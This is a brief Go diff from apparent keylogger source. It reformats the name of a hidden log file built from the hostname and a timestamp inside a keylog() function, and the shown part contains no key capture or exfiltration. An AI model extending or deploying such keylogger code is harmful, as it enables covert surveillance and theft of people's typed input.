@@ -77,7 +77,10 @@ func keylog() {
 					panic(err)
 				}
 				file.Close()
-				fileName := fmt.Sprintf(".%s - %s.txt", hostName, runTime.Format(time.ANSIC))
+				fileName := fmt.Sprintf(".%s - %s %s.txt",
+				hostName,
+				runTime.Format("Jan 02 2006"),
+				runTime.Format(time.Kitchen))
 				file, err = os.Create(fileName)
 				if err != nil {
 					panic(err)
